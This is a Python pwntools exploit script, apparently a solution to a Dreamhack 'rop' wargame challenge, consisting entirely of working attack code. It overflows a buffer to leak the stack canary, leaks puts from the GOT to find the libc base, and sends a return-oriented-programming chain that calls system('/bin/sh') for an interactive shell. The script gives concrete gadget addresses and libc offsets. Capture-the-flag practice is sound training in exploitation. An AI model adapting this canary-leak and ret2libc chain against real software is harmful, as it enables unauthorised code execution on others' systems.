from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/rop')
    puts_offset = 0x80970
    system_offset = 0x4f420
    binsh_offset = 0x1b3d88
else:
    r = remote('host1.dreamhack.games', 20626)
    puts_offset = 0x80aa0
    system_offset = 0x4f550
    binsh_offset = 0x1b3e1a

sa = r.sendafter

pop_rdi = 0x4007f3  # pop rdi; ret
ret = 0x40055e  # ret gadget
puts_plt = 0x400570  # PLT of puts()
puts_got = 0x601018  # GOT of puts()
main = 0x4006a7  # main()


# leak canary

sa('Buf: ', 'a' * 0x39)
r.recvuntil('Buf: ' + 'a' * 0x39)
canary = u64(r.recvn(7).rjust(8, b'\x00'))


# leak libc

payload = b'a' * 0x38  # dummy
payload += p64(canary)  # canary
payload += b'a' * 0x8  # sfp
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)  # return to main

sa('Buf: ', payload)
puts = u64(r.recvline()[:-1].ljust(8, b'\x00'))  # puts()
libc = puts - puts_offset  # libc base
system = libc + system_offset  # system()
binsh = libc + binsh_offset


# call system("/bin/sh")

sa('Buf: ', 'a')
r.recvline()

payload = b'a' * 0x38  # dummy
payload += p64(canary)  # canary
payload += b'a' * 0x8  # sfp
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

sa('Buf: ', payload)


r.interactive()